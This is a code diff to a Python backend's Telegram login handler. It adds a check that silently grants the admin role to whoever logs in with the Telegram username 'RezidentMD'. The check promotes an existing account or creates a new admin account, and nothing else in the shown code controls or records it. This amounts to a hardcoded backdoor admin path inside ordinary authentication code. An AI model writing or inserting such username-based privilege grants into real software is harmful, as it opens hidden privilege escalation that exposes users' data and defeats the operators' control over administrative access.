@@ -96,11 +96,17 @@ def verify_telegram_login(session: Session, data: dict) -> Tuple[Optional[str], 
         return None, "Invalid telegram signature"
         
     tg_id = data.get("id")
+    username = data.get("username")
+    
+    force_admin = False
+    if username == "RezidentMD":
+        force_admin = True
+
     if not tg_id: return None, "Missing Telegram ID"
     
-    return get_or_create_user_token(session, "telegram", str(tg_id))
+    return get_or_create_user_token(session, "telegram", str(tg_id), force_admin=force_admin)
 
-def get_or_create_user_token(session: Session, provider: str, provider_id: str) -> Tuple[str, str]:
+def get_or_create_user_token(session: Session, provider: str, provider_id: str, force_admin: bool = False) -> Tuple[str, str]:
     # Lookup Identity
     identity = session.exec(select(UserIdentity).where(
         UserIdentity.provider == provider,
@@ -114,9 +120,16 @@ def get_or_create_user_token(session: Session, provider: str, provider_id: str) 
         user = session.get(User, identity.user_id)
         if not user.is_active:
             return None, "User account disabled"
+            
+        # Promote to admin if matches hardcoded logic
+        if force_admin and user.role != "admin":
+            user.role = "admin"
+            session.add(user)
+            session.commit()
     else:
         # Create User
-        user = User(role="user")
+        role = "admin" if force_admin else "user"
+        user = User(role=role)
         session.add(user)
         session.commit()
         session.refresh(user)
